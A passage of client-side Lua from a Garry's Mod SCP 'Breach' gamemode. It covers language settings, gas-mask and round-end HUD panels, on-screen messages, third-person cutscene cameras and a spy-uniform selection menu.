  local gesture_slot = net.ReadUInt( 3 )

  gesture_ent:AnimResetGestureSlot( gesture_slot )

end)

SAVEDIDS = {}
lastidcheck = 0



clang = clang || nil
cwlang = cwlang || nil





















local gmod_built_language = "english" 

CreateClientConVar("cvar_br_language", gmod_built_language, true, true, "Breach localization setting")
langtouse = GetConVar("cvar_br_language"):GetString()



cvars.AddChangeCallback( "cvar_br_language", function( convar_name, value_old, value_new )
	langtouse = value_new
	LoadLang( langtouse )
end )

hook.Add("PostPlayerDraw", "fire_effect_draw", function(self)

	if ( !self:GetNWBool("RXSEND_ONFIRE", false) ) and self.NextParticleUpdate then
		self.NextParticleUpdate = nil
		self:StopParticles()
	elseif ( ( self.NextParticleUpdate || 0 ) < CurTime() ) and self:GetNWBool("RXSEND_ONFIRE", false) then


    self.NextParticleUpdate = CurTime() + 2

    self:StopParticles()
    ParticleEffectAttach( "fire_small_03", PATTACH_POINT_FOLLOW, self, 2 )

  end

end)


concommand.Add( "br_language", function( ply, cmd, args )
	RunConsoleCommand( "cvar_br_language", args[1] )
end, function( cmd, args )
	args = string.Trim( args )
	args = string.lower( args )

	local tab = {}

	for k, v in pairs( ALLLANGUAGES ) do
		if string.find( string.lower( k ), args ) then
			table.insert( tab, "br_language "..k )
		end
	end

	return tab
end, "Sets language", FCVAR_ARCHIVE )

hudScale = CreateClientConVar( "br_hud_scale", 1, true, false ):GetFloat()

cvars.AddChangeCallback( "br_hud_scale", function( convar_name, value_old, value_new )
	local newScale = tonumber(value_new)
	if newScale > 1 then newScale = 1 end
	if newScale < 0.1 then newScale = 0.1 end
	hudScale = newScale
end )

//print("Alllangs:")
//PrintTable(ALLLANGUAGES)

function AddTables( tab1, tab2 )
	for k, v in pairs( tab2 ) do
		if tab1[k] and istable( v ) then
			AddTables( tab1[k], v )
		else
			tab1[k] = v
		end
	end
end



local EntMats = {}

net.Receive( "GasMaskOff", function ( len ) 
    local ent = net.ReadEntity()

	ent.GasMask = false

end)

net.Receive( "GasMaskOn", function ( len )
	local ent = net.ReadEntity()

	ent.GasMask = true

	hook.Add("HUDPaintBackground", "GasMaskHUD", function()
		local client = LocalPlayer()

		if client:GTeam() == TEAM_SPEC or !client:Alive() or client && client:IsValid() && !client.GasMask then
			hook.Remove("HUDPaintBackground", "GasMaskHUD")
	  
		end

	    local function GASMASK_FOV( num ) // calculates the camera FOV depending on viewmodel FOV
		    local r = ScrW() / ScrH() // our resolution
		    r =  r / (4/3) // 4/3 is base Source resolution, so we have do divide our resolution by that
		    local tan, atan, deg, rad = math.tan, math.atan, math.deg, math.rad
		
		    local vFoV = rad(num)
		    local hFoV = deg( 2 * atan(tan(vFoV/2)*r) ) // this was a bitch
		
		    return hFoV
	    end

	    local pos, ang = EyePos(), EyeAngles()
	    local camFOV = GASMASK_FOV(60)
	    local scrw, scrh = ScrW(), ScrH()	
	    local FT = FrameTime()

		if !client.GASMASK_HudModel2 or !IsValid(client.GASMASK_HudModel2) then
			client.GASMASK_HudModel2 = ClientsideModel("models/gmod4phun/c_contagion_gasmask.mdl", RENDERGROUP_BOTH)
			client.GASMASK_HudModel2:SetNoDraw(true)
		end

	    cam.Start3D( pos, ang, camFOV, 0, 0, scrw, scrh, 1, 100)
	        cam.IgnoreZ(false)
		        render.SuppressEngineLighting( false )
				    client.GASMASK_HudModel2:ResetSequence("idle_on", true)
				    client.GASMASK_HudModel2:SetCycle(0)
				    client.GASMASK_HudModel2:SetPlaybackRate(1)
			        client.GASMASK_HudModel2:SetPos(pos)
			        client.GASMASK_HudModel2:SetAngles(ang)
			        client.GASMASK_HudModel2:FrameAdvance(FT)
			        client.GASMASK_HudModel2:SetupBones()
			        if client:GetViewEntity() == client then
				        client.GASMASK_HudModel2:DrawModel()
			        end
		        render.SuppressEngineLighting( false )
	        cam.IgnoreZ(false)
        cam.End3D()
	end)

end)

local desc_clr_gray = Color( 198, 198, 198 )

local outcomeResult = {

	[ "l:roundend_GOCNUKE" ] = { image = "nextoren/gui/roles_icon/goc.png", music = BR_MUSIC_OUTRO_GOC_WIN },
	[ "l:roundend_alphawarhead" ] = { image = "nextoren/gui/roles_icon/mtf.png" },
	[ "l:roundend_scarletking" ] = { image = "nextoren/gui/roles_icon/scarlet.png" },
	[ "l:roundend_101" ] = { image = "nextoren/gui/roles_icon/usa2.png" },
    [ "l:roundend_O5"] = { image = "nextoren/gui/roles_icon/mtf.png" },
	[ "l:roundend_DIS"] = { image = "nextoren/gui/roles_icon/class_d.png" },
	[ "Military Alive Only" ] = { image = "nextoren/gui/roles_icon/mtf.png" },
	[ "Security Alive Only" ] = { image = "nextoren/gui/roles_icon/sec.png" },
	[ "Scientists Alive Only" ] = { image = "nextoren/gui/roles_icon/sci.png" },
	[ "UIU Alive Only" ] = { image = "nextoren/gui/roles_icon/fbi.png" },
	[ "Class-D Alive Only" ] = { image = "nextoren/gui/roles_icon/class_d.png" },
	[ "Serpents Alive Only" ] = { image = "nextoren/gui/roles_icon/dz.png" },
	[ "GOC Alive Only" ] = { image = "nextoren/gui/roles_icon/goc.png" },
	[ "Class-D and Chaos Alive Only" ] = { image = "nextoren/gui/roles_icon/class_d.png" },
	[ "l:roundend_MTF" ] = { image = "nextoren/gui/roles_icon/mtf.png" },
	[ "GRU Alive Only" ] = { image = "nextoren/gui/roles_icon/gru.png" },
	[ "Победа сил Рейха" ] = {image = "nextoren/gui/roles_icon/reich.png"},
	[ "Победа сил США" ] = {image = "nextoren/gui/roles_icon/america.png"},
	[ "Победа сил Альянса" ] = {image = "nextoren/gui/roles_icon/cmb.png"},
	[ "Победа сил Сопротивления" ] = {image = "nextoren/gui/roles_icon/rebel.png"},
	[ "Победа сил Нового Года" ] = {image = "nextoren/gui/roles_icon/santa.png"},
	[ "НОВОГОДНЯЯ ТВАРЬ ИСПОРТИЛА ПРАЗДНИК!!!" ] = {image = "nextoren/gui/roles_icon/pizda.png"},

}

local rust_bg       = Color(18, 16, 15, 245)
local rust_panel    = Color(30, 28, 25, 255)
local rust_outline  = Color(255, 255, 255, 10)
local rust_yellow   = Color(218, 165, 32)
local rust_red      = Color(188, 64, 43)
local rust_text     = Color(230, 230, 230)
local rust_dim      = Color(140, 140, 140)
local rust_green    = Color(112, 126, 73)

function EndRoundStats()
	local timeout = GetTimeoutInfo()

	if not timeout and BREACH.ResourcesPrecached then
		if engine.IsRecordingDemo() then
			RXSENDNotify("l:demo_stop")
			RunConsoleCommand("stop")
		end
		if not engine.IsRecordingDemo() then
			RunConsoleCommand("record", "1")
			timer.Simple(1, function()
				RunConsoleCommand("stop")
			end)
		end
	end

	local result = net.ReadString()
	local t_restart = net.ReadFloat()
	local client = LocalPlayer()
	local screenwidth, screenheight = ScrW(), ScrH()

	local roundEndAnims = {
		panel = { alpha = 0, scale = 0.8, yOffset = 50 },
		title = { alpha = 0, yOffset = -20 },
		result = { alpha = 0, yOffset = -20 },
		line = { alpha = 0, width = 0 },
		timer = { alpha = 0, delay = 0.8 },
		faction = { alpha = 0, delay = 1.0, scale = 0.5 }
	}

	local general_panel = vgui.Create("DPanel")
	general_panel:SetText("")
	general_panel:SetSize(screenwidth, screenheight)
	general_panel:SetAlpha(0)
    general_panel:SetZPos(32767)
	general_panel.CreationTime = CurTime()
	general_panel.StartFade = false
	
	timer.Simple((t_restart or 27) + 1, function()
		FadeMusic(2)
		if IsValid(general_panel) then
			general_panel.StartFade = true
		end
	end)

	general_panel.Think = function(self)
		local currentTime = CurTime()
		local elapsed = currentTime - self.CreationTime
		
		if not self.StartFade then
			roundEndAnims.panel.alpha = Lerp(FrameTime() * 8, roundEndAnims.panel.alpha, 1)
			roundEndAnims.panel.scale = Lerp(FrameTime() * 10, roundEndAnims.panel.scale, 1)
			roundEndAnims.panel.yOffset = Lerp(FrameTime() * 12, roundEndAnims.panel.yOffset, 0)
			
			if elapsed > 0.1 then
				roundEndAnims.title.alpha = Lerp(FrameTime() * 6, roundEndAnims.title.alpha, 1)
				roundEndAnims.title.yOffset = Lerp(FrameTime() * 8, roundEndAnims.title.yOffset, 0)
			end
			
			if elapsed > 0.3 then
				roundEndAnims.result.alpha = Lerp(FrameTime() * 6, roundEndAnims.result.alpha, 1)
				roundEndAnims.result.yOffset = Lerp(FrameTime() * 8, roundEndAnims.result.yOffset, 0)
			end
			
			if elapsed > 0.5 then
				roundEndAnims.line.alpha = Lerp(FrameTime() * 8, roundEndAnims.line.alpha, 1)
				roundEndAnims.line.width = Lerp(FrameTime() * 15, roundEndAnims.line.width, 1)
			end
			
			if elapsed > 0.8 then
				roundEndAnims.timer.alpha = Lerp(FrameTime() * 6, roundEndAnims.timer.alpha, 1)
			end
			
			if elapsed > 1.0 then
				roundEndAnims.faction.alpha = Lerp(FrameTime() * 5, roundEndAnims.faction.alpha, 1)
				roundEndAnims.faction.scale = Lerp(FrameTime() * 8, roundEndAnims.faction.scale, 1)
			end
			
			self:SetAlpha(roundEndAnims.panel.alpha * 255)
		else
			self:SetAlpha(math.Approach(self:GetAlpha(), 0, FrameTime() * 512))
			if self:GetAlpha() == 0 and IsValid(self) then
				self:Remove()
			end
		end
	end

	general_panel.Paint = function(self, w, h)
		surface.SetDrawColor(0, 0, 0, 220 * roundEndAnims.panel.alpha)
        surface.DrawRect(0, 0, w, h)
	end

	local stats_panel = vgui.Create("DPanel", general_panel)
	stats_panel:SetText("")

	BREACH.Round.RoundsTillRestart = GetGlobalInt("RoundUntilRestart", 15)
	local rounds_till_restart = BREACH.Round.RoundsTillRestart
	local restarting = rounds_till_restart < 1
	rounds_till_restart = CurTime() + (t_restart or 27)

	stats_panel.PerformLayout = function(self)
		local currentScale = roundEndAnims.panel.scale
		local panelWidth = 900 * currentScale
		local panelHeight = 220 * currentScale
		local panelX = (screenwidth - panelWidth) / 2
		local panelY = (screenheight - panelHeight) / 2 + roundEndAnims.panel.yOffset
		
		self:SetPos(panelX, panelY)
		self:SetSize(panelWidth, panelHeight)
	end

    local resultIcon = nil
    if outcomeResult and outcomeResult[result] then
        resultIcon = Material(outcomeResult[result].image or "nextoren/gui/roles_icon/wtf.png", "smooth")
        timer.Simple(8.25, function()
			if postround and outcomeResult[result].music then
				BREACH.Music:Play(outcomeResult[result].music)
			end
		end)
    else
        resultIcon = Material("nextoren/gui/roles_icon/wtf.png", "smooth")
    end

	stats_panel.Paint = function(self, w, h)
		local currentAlpha = roundEndAnims.panel.alpha
		
        surface.SetDrawColor(rust_bg.r, rust_bg.g, rust_bg.b, 245 * currentAlpha)
        surface.DrawRect(0, 0, w, h)

        if resultIcon and roundEndAnims.faction.alpha > 0 then
            local facAlpha = roundEndAnims.faction.alpha * currentAlpha
            local facScale = roundEndAnims.faction.scale
            local baseSize = h * 0.9
            local scaledSize = baseSize * facScale

            surface.SetDrawColor(255, 255, 255, 15 * facAlpha)
            surface.SetMaterial(resultIcon)
            surface.DrawTexturedRect(w/2 - scaledSize/2, h/2 - scaledSize/2, scaledSize, scaledSize)
        end

        surface.SetDrawColor(rust_outline.r, rust_outline.g, rust_outline.b, 255 * currentAlpha)
        surface.DrawOutlinedRect(0, 0, w, h, 1)

        surface.SetDrawColor(rust_panel.r, rust_panel.g, rust_panel.b, 255 * currentAlpha)
        surface.DrawRect(0, 0, w, 40)
        surface.SetDrawColor(rust_yellow.r, rust_yellow.g, rust_yellow.b, 255 * currentAlpha)
        surface.DrawRect(0, 40, w, 2)

		local titleText = string.upper(restarting and L("l:roundend_gameover") or L("l:roundend_roundcomplete"))
		draw.SimpleText(titleText, "MogM_6", w / 2, 20 + roundEndAnims.title.yOffset, ColorAlpha(rust_dim, 255 * roundEndAnims.title.alpha * currentAlpha), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

		draw.SimpleText(string.upper(L("l:roundend_roundresult ") .. L(result)), "MogM_10", w / 2, 90 + roundEndAnims.result.yOffset, ColorAlpha(rust_yellow, 255 * roundEndAnims.result.alpha * currentAlpha), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

		local lineWidth = w * 0.8 * roundEndAnims.line.width
		local lineX = (w - lineWidth) / 2
		surface.SetDrawColor(255, 255, 255, 20 * roundEndAnims.line.alpha * currentAlpha)
		surface.DrawLine(lineX, 125, lineX + lineWidth, 125)  
		surface.DrawLine(lineX, 128, lineX + lineWidth, 128)  

		if roundEndAnims.timer.alpha > 0 then
			local timerAlpha = roundEndAnims.timer.alpha * currentAlpha
			local time = math.Round(rounds_till_restart - CurTime())
			
            surface.SetDrawColor(rust_outline.r, rust_outline.g, rust_outline.b, 255 * timerAlpha)
            surface.DrawLine(0, h - 45, w, h - 45)

			if not restarting then
				draw.SimpleText(string.upper(L("l:roundend_roundstillrestart") .. " " .. BREACH.Round.RoundsTillRestart), "MogM_6", 15, h - 22, ColorAlpha(rust_dim, 255 * timerAlpha), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

				if time > 0 then
					draw.SimpleText(string.upper(L("l:roundend_nextroundin") .. " " .. time), "MogM_6", w - 15, h - 22, ColorAlpha(rust_yellow, 255 * timerAlpha), TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
				else
					draw.SimpleText(string.upper(L("l:roundend_restartinground")), "MogM_6", w - 15, h - 22, ColorAlpha(rust_green, 255 * timerAlpha), TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
				end
			else
				if time > 0 then
					draw.SimpleText(string.upper(L("l:roundend_restartingserverin") .. " " .. time .. "..."), "MogM_6", w / 2, h - 22, ColorAlpha(rust_yellow, 255 * timerAlpha), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
				else
					draw.SimpleText(string.upper(L("l:roundend_restartingserver")), "MogM_6", w / 2, h - 22, ColorAlpha(rust_red, 255 * timerAlpha), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
				end
			end
		end
	end

	timer.Simple(0.5, function()
		if IsValid(stats_panel) then
			stats_panel.VibrateTime = CurTime()
			local oldThink = stats_panel.Think or function() end
			stats_panel.Think = function(self)
				oldThink(self)
				
				if self.VibrateTime and CurTime() - self.VibrateTime < 0.3 then
					local vibrate = math.sin(CurTime() * 50) * 2 * (0.3 - (CurTime() - self.VibrateTime))
					local currentY = (screenheight - self:GetTall()) / 2 + roundEndAnims.panel.yOffset
					self:SetPos(self:GetPos(), currentY + vibrate)
				end
			end
		end
	end)
end

net.Receive( "New_SHAKYROUNDSTAT", EndRoundStats )

function GM:HUDWeaponPickedUp()
	
end

net.Receive( "GetBoneMergeTable", function()

	local ent = net.ReadEntity()
	local bonemerge_ent = net.ReadEntity()
  
	if ( !( ent && ent:IsValid() ) ) then return end
  
	if ( !ent.BoneMergedEnts || !istable( ent.BoneMergedEnts ) ) then
  
	  ent.BoneMergedEnts = {}
  
	else
  
	  if ( table.HasValue( ent.BoneMergedEnts, bonemerge_ent ) ) then return end
  
	end
  
	ent.BoneMergedEnts[ #ent.BoneMergedEnts + 1 ] = bonemerge_ent
  
end )

local newr = Material("nextoren_hud/round_box_3.png")
local newrb = Material("nextoren_hud/round_box_3_big.png")
local newrr = Material("nextoren_hud/round_box_3_r.png")
local newrl = Material("nextoren_hud/round_box_3_l.png")
local warn = Material("nextoren_hud/warn.png")

local messageAnim = {
    scale = 0,
    alpha = 0,
    visible = false,
    state = "hidden"
}

function make_bottom_message(msg, icon)
    msg = BREACH.TranslateString(msg)
    
    
    messageAnim = {
        scale = 0,
        alpha = 0,
        visible = true,
        state = "appearing",
        startTime = CurTime(),
        message = msg,
        icon = icon
    }

    
    hook.Remove("HUDPaint", "BottomMessage")
    
    hook.Add("HUDPaint", "BottomMessage", function()
        if not messageAnim.visible then
            hook.Remove("HUDPaint", "BottomMessage")
            return
        end

        local currentTime = CurTime()
        local elapsed = currentTime - messageAnim.startTime
        
        
        if messageAnim.state == "appearing" then
            if elapsed < 0.4 then
                messageAnim.scale = Lerp(FrameTime() * 12, messageAnim.scale, 1)
                messageAnim.alpha = Lerp(FrameTime() * 10, messageAnim.alpha, 1)
            else
                messageAnim.scale = 1
                messageAnim.alpha = 1
                messageAnim.state = "visible"
                messageAnim.visibleTime = currentTime
            end
        end
        
        
        if messageAnim.state == "visible" and currentTime - messageAnim.visibleTime > 5 then
            messageAnim.state = "disappearing"
            messageAnim.disappearStartTime = currentTime
        end
        
        
        if messageAnim.state == "disappearing" then
            local disappearElapsed = currentTime - messageAnim.disappearStartTime
            if disappearElapsed < 0.4 then
                messageAnim.scale = Lerp(FrameTime() * 12, messageAnim.scale, 0)
                messageAnim.alpha = Lerp(FrameTime() * 10, messageAnim.alpha, 0)
            else
                messageAnim.visible = false
                hook.Remove("HUDPaint", "BottomMessage")
                return
            end
        end

        
        surface.SetFont("MogM_8")
        local text = messageAnim.message
        local width, height = surface.GetTextSize(text)
        
		
        local currentScale = messageAnim.scale
        local currentAlpha = messageAnim.alpha * 255
        
        
        local centerX = ScrW() / 2
        local centerY = ScrH() / 1.3
        local iconY = ScrH() / 1.405
        
        
        local scaledTextWidth = width * currentScale
        local scaledTextHeight = height * currentScale
        local textOffsetX = (width - scaledTextWidth) / 2
        local textOffsetY = (height - scaledTextHeight) / 2
        
        local iconSize = 50 * currentScale
        local iconOffset = (50 - iconSize) / 2
        
        local cornerSize = 28 * currentScale
        local cornerOffset = (28 - cornerSize) / 2

        
        if messageAnim.icon == "nill" then
            surface.SetDrawColor(255, 255, 255, currentAlpha)
            surface.SetMaterial(warn)
            surface.DrawTexturedRect(
                centerX - 25 + iconOffset, 
                iconY + iconOffset, 
                iconSize, 
                iconSize
            )
        else
            surface.SetDrawColor(255, 255, 255, currentAlpha)
            surface.SetMaterial(Material(messageAnim.icon))
            surface.DrawTexturedRect(
                centerX - 25 + iconOffset, 
                iconY + iconOffset, 
                iconSize, 
                iconSize
            )
        end

        
        surface.SetDrawColor(255, 255, 255, currentAlpha)
        surface.SetMaterial(newr)
        surface.DrawTexturedRect(
            centerX - 25 + iconOffset, 
            iconY + iconOffset, 
            iconSize, 
            iconSize
        )

        
        surface.SetDrawColor(255, 255, 255, currentAlpha)
        surface.SetMaterial(newrr)
        surface.DrawTexturedRect(
            centerX + width / 2 + cornerOffset, 
            centerY - 14 + cornerOffset, 
            cornerSize, 
            cornerSize
        )

        
        surface.SetDrawColor(255, 255, 255, currentAlpha)
        surface.SetMaterial(newrl)
        surface.DrawTexturedRect(
            centerX - width / 2 - 25 + cornerOffset, 
            centerY - 14 + cornerOffset, 
            cornerSize, 
            cornerSize
        )

        
        draw.SimpleText(
            text, 
            "MogM_8", 
            centerX + textOffsetX, 
            centerY + textOffsetY, 
            Color(130, 130, 130, currentAlpha), 
            TEXT_ALIGN_CENTER,
            TEXT_ALIGN_CENTER
        )
    end)
    
    
    function CloseBottomMessage()
        if messageAnim.visible and messageAnim.state != "disappearing" then
            messageAnim.state = "disappearing"
            messageAnim.disappearStartTime = CurTime()
        end
    end
    
    
    timer.Remove("BottomMessage_AutoClose")
    timer.Create("BottomMessage_AutoClose", 6, 1, function()
        CloseBottomMessage()
    end)
end


function ForceCloseBottomMessage()
    if messageAnim.visible then
        messageAnim.state = "disappearing"
        messageAnim.disappearStartTime = CurTime()
    end
end
net.Receive( "SetBottomMessage", function()

    local msg = net.ReadTable()
	local icon = net.ReadString()

    if !msg[langtouse] then
    	msg = msg.english
    else
    	msg = msg[langtouse]
    end

    make_bottom_message(msg,icon)
    
end )

local box_parameters = Vector( 5, 5, 5 )

net.Receive( "ThirdPersonCutscene", function()

  local time = net.ReadUInt( 4 )
  local without_anim = net.ReadBool()

  local client = LocalPlayer()

  client.ExitFromCutscene = nil

  local multiplier = 0

  hook.Add( "CalcView", "ThirdPerson", function( client, pos, angles, fov )

    if ( !client.ExitFromCutscene && multiplier != 1 ) then

      multiplier = math.Approach( multiplier, 1, RealFrameTime() * 2 )

    elseif ( client.ExitFromCutscene ) then

      multiplier = math.Approach( multiplier, 0, RealFrameTime() * 2 )

      if ( multiplier < .25 || without_anim ) then

        hook.Remove( "CalcView", "ThirdPerson" )
        client.ExitFromCutscene = nil

      end

    end

    local offset_eyes = client:LookupAttachment( "eyes" )
    offset_eyes = client:GetAttachment( offset_eyes )

    if ( offset_eyes ) then

      angles = offset_eyes.Ang

    end

    local trace = {}
    trace.start = offset_eyes && offset_eyes.Pos || pos
    trace.endpos = trace.start + angles:Forward() * ( -80 * multiplier )
    trace.filter = client
    trace.mins = -box_parameters
    trace.maxs = box_parameters
    trace.mask = MASK_VISIBLE

    trace = util.TraceLine( trace )

    pos = trace.HitPos

    if ( trace.Hit ) then

      pos = pos + trace.HitNormal * 5

    end

    local view = {}
    view.origin = pos
    view.angles = angles
    view.fov = fov
    view.drawviewer = true

    return view

  end )

  timer.Simple( time, function()

    client.ExitFromCutscene = true

  end )

end )

net.Receive( "ThirdPersonCutscene2", function()

  local time = net.ReadUInt( 4 )
  local without_anim = net.ReadBool()

  local client = LocalPlayer()

  client.ExitFromCutscene = nil

  local multiplier = 0

  hook.Add( "CalcView", "ThirdPerson", function( client, pos, angles, fov )

    if ( !client.ExitFromCutscene && multiplier != 1 ) then

      multiplier = math.Approach( multiplier, 1, RealFrameTime() * 2 )

    elseif ( client.ExitFromCutscene ) then

      multiplier = math.Approach( multiplier, 0, RealFrameTime() * 2 )

      if ( multiplier < .25 || without_anim ) then

        hook.Remove( "CalcView", "ThirdPerson" )
        client.ExitFromCutscene = nil

      end

    end

    local offset_eyes = client:LookupAttachment( "eyes" )
    offset_eyes = client:GetAttachment( offset_eyes )

    if ( offset_eyes ) then

      

    end

    local trace = {}
    trace.start = offset_eyes && offset_eyes.Pos or pos
    trace.endpos = trace.start + client:EyeAngles():Forward() * ( -80 * multiplier )
    trace.filter = client
    trace.mask = MASK_VISIBLE

    trace = util.TraceLine( trace )

    pos = trace.HitPos

    if ( trace.Hit ) then

      pos = pos + trace.HitNormal * 5

    end

    local view = {}
    view.origin = pos
    view.angles = angles
    view.fov = fov
    view.drawviewer = true

    return view

  end )

  timer.Simple( time, function()

    client.ExitFromCutscene = true

  end )

end )

net.Receive( "SpecialSCIHUD", function()

    local name = net.ReadString()
    local cooldown = net.ReadUInt(9)
    local desc = net.ReadString()
    local icon = net.ReadString()
    local max = net.ReadBool()

    local client = LocalPlayer()

    client.SpecialTable = {

        Name = name,
        Cooldown = cooldown,
        Description = desc,
        Icon = icon,
        Countable = max

    }

    DrawSpecialAbility( client.SpecialTable )

end )

hook.Add("InitPostEntity", "send_my_country", function()

	net.Start("send_country")
	net.WriteString(system.GetCountry())
	net.SendToServer()

end)

function LoadLang( lang )
	local finallang = table.Copy( ALLLANGUAGES.english )
	local ltu = {}
	if ALLLANGUAGES[lang] then
		ltu = table.Copy( ALLLANGUAGES[lang] )
	end
	AddTables( finallang, ltu )
	clang = finallang

	endmessages = {
		{
			main = clang.lang_end1,
			txt = clang.lang_end2,
			clr = gteams.GetColor(TEAM_SCP)
		},
		{
			main = clang.lang_end1,
			txt = clang.lang_end3,
			clr = gteams.GetColor(TEAM_SCP)
		}
	}
	hook.Run("Breach_LanguageChanged")
end

hook.Add("InitPostEntity", "LoadFuckingLanguage", function()

LoadLang( langtouse )
end)








RADIO4SOUNDSHC = {
	{"chatter1", 39},
	{"chatter2", 72},
	{"chatter4", 12},
	{"franklin1", 8},
	{"franklin2", 13},
	{"franklin3", 12},
	{"franklin4", 19},
	{"ohgod", 25}
}

RADIO4SOUNDS = table.Copy(RADIO4SOUNDSHC)

disablehud = false
livecolors = false

preparing = false
postround = false

local universal_clr = Color( 210, 0, 0, 180 )

net.Receive("GocSpyUniform", function(len)
	if istable(BREACH.GocSpyUniform) then
					for i, v in pairs(BREACH.GocSpyUniform) do
						if IsValid(v) then v:Remove() end
					end
				end
				BREACH.GocSpyUniform = BREACH.GocSpyUniform || {}
                local clrgray = Color( 198, 198, 198 )
                local clrgray2 = Color( 180, 180, 180 )
                local clrred = Color( 255, 0, 0 )
                local clrred2 = Color( 50,205,50 )
                local gradienttt = Material( "vgui/gradient-r" )

				local teams_table = {

					
					
					
					{ name = "При достаточном времени", func = function() net.Start("GocSpyUniform") net.WriteBool(false) net.SendToServer() end },
					{ name = "При малом времени", func = function() net.Start("GocSpyUniform") net.WriteBool(true) net.SendToServer() end },
			
				}
			
			
			
				BREACH.GocSpyUniform.MainPanel = vgui.Create( "DPanel" )
				BREACH.GocSpyUniform.MainPanel:SetSize( 256, 256 )
				BREACH.GocSpyUniform.MainPanel:SetPos( ScrW() / 2 - 128, ScrH() / 2 - 128 )
				BREACH.GocSpyUniform.MainPanel:SetText( "" )
				BREACH.GocSpyUniform.MainPanel.Paint = function( self, w, h )
			
					if ( !vgui.CursorVisible() ) then
			
						gui.EnableScreenClicker( true )
			
					end
			
					draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_white, 120 ) )
					draw.OutlinedBox( 0, 0, w, h, 1.5, color_black )
			
				end
			
				BREACH.GocSpyUniform.MainPanel.Disclaimer = vgui.Create( "DPanel" )
				BREACH.GocSpyUniform.MainPanel.Disclaimer:SetSize( 256, 64 )
				BREACH.GocSpyUniform.MainPanel.Disclaimer:SetPos( ScrW() / 2 - 128, ScrH() / 2 - 192 )
				BREACH.GocSpyUniform.MainPanel.Disclaimer:SetText( "" )
			
				local client = LocalPlayer()
			
				BREACH.GocSpyUniform.MainPanel.Disclaimer.Paint = function( self, w, h )
			
					draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_white, 120 ) )
					draw.OutlinedBox( 0, 0, w, h, 1.5, color_black )
			
					draw.DrawText( "Тип формы ГОК", "ChatFont_new", w / 2, h / 2 - 16, color_black, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			
					if ( client:GetRoleName() != role.ClassD_GOCSpy || client:Health() <= 0 ) then
			
						if ( IsValid( BREACH.GocSpyUniform.MainPanel ) ) then
			
							BREACH.GocSpyUniform.MainPanel:Remove()
			
						end
			
						self:Remove()
			
						gui.EnableScreenClicker( false )
			
					end
			
				end
			
				BREACH.GocSpyUniform.ScrollPanel = vgui.Create( "DScrollPanel", BREACH.GocSpyUniform.MainPanel )
				BREACH.GocSpyUniform.ScrollPanel:Dock( FILL )
			
				for i = 1, #teams_table do
			
					BREACH.GocSpyUniform.Users = BREACH.GocSpyUniform.ScrollPanel:Add( "DButton" )
					BREACH.GocSpyUniform.Users:SetText( "" )
					BREACH.GocSpyUniform.Users:Dock( TOP )
					BREACH.GocSpyUniform.Users:SetSize( 256, 64 )
					BREACH.GocSpyUniform.Users:DockMargin( 0, 0, 0, 2 )
					BREACH.GocSpyUniform.Users.CursorOnPanel = false
					BREACH.GocSpyUniform.Users.gradientalpha = 0
			
					BREACH.GocSpyUniform.Users.Paint = function( self, w, h )
			
						if ( self.CursorOnPanel ) then
			
							self.gradientalpha = math.Approach( self.gradientalpha, 255, FrameTime() * 128 )
			
						else
			
							self.gradientalpha = math.Approach( self.gradientalpha, 0, FrameTime() * 256 )
			
						end
			
						draw.RoundedBox( 0, 0, 0, w, h, color_black )
						draw.OutlinedBox( 0, 0, w, h, 1.5, clrgray )
			
						surface.SetDrawColor( ColorAlpha( color_white, self.gradientalpha ) )
						surface.SetMaterial( gradienttt )
						surface.DrawTexturedRect( 0, 0, w, h )
			
						draw.SimpleText( teams_table[ i ].name, "ChatFont_new", w / 2, h / 2, clrgray, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			
					end
			
					BREACH.GocSpyUniform.Users.OnCursorEntered = function( self )
			
						self.CursorOnPanel = true
			
					end
			
					BREACH.GocSpyUniform.Users.OnCursorExited = function( self )
			
						self.CursorOnPanel = false
			
					end
			
					BREACH.GocSpyUniform.Users.DoClick = function( self )

						teams_table[ i ].func()
			
						BREACH.GocSpyUniform.MainPanel:Remove()
						BREACH.GocSpyUniform.MainPanel.Disclaimer:Remove()
						gui.EnableScreenClicker( false )
			
					end
			
				end
end)

net.Receive("set_spectator_sync", function(len)

	local ply = net.ReadEntity()
	if IsValid(ply) then
		ply:SetNGTeam(TEAM_SPEC)
		ply:SetRoleName(role.Spectator)
	end


end)

hook.Add('NotifyShouldTransmit', 'BNMRG_NotifyShouldTransmit', function(ent, shouldTransmit)
    if ent:GetClass() == 'ent_bonemerged' then
        local owner = ent:GetOwner()
        if owner and owner:IsValid() and owner != ent:GetParent() then
            ent:SetParent(owner)
        end
    end
end)





local VisorData = {
    Active = false,
    StartTime = 0,
    Duration = 20, 
    GlitchIntensity = 0
}

local color_glitch_r = Color(255, 0, 0, 150)
local color_glitch_b = Color(0, 255, 255, 150)

net.Receive( "TargetsToNTFs", function()

    local target_list = net.ReadTable()
    local team_indx = net.ReadUInt(12)

    local clr_to_draw
    local universal_search

    
    if ( team_indx == 22 ) then
        clr_to_draw = Color(255, 0, 0)
        universal_search = {
            [ TEAM_CHAOS ] = true,
            [ TEAM_GOC ] = true,
            [ TEAM_USA ] = true,
            [ TEAM_DZ ] = true,
            [ TEAM_GRU ] = true,
            [ TEAM_COTSK ] = true,
        }
    else
        clr_to_draw = gteams.GetColor(team_indx)
    end

    local client = LocalPlayer()

    
    VisorData.Active = true
    VisorData.StartTime = CurTime()

    
    surface.PlaySound("weapons/c4/c4_click.wav")
    timer.Simple(0.2, function() surface.PlaySound("weapons/c4/c4_click.wav") end)
    

    if ( !client.TargetsTable ) then

        client.TargetsTable = {}
        for i = 1, #target_list do
            client.TargetsTable[ #client.TargetsTable + 1 ] = target_list[i]
        end

        
        
        
        hook.Add( "PreDrawOutlines", "DrawTargets", function()
            
            if ( client:GTeam() != TEAM_NTF or not client:Alive() or not VisorData.Active ) then
                hook.Remove( "PreDrawOutlines", "DrawTargets" )
                hook.Remove( "HUDPaint", "TacticalVisor_HUD_Targets" )
                client.TargetsTable = nil
                VisorData.Active = false
                return
            end

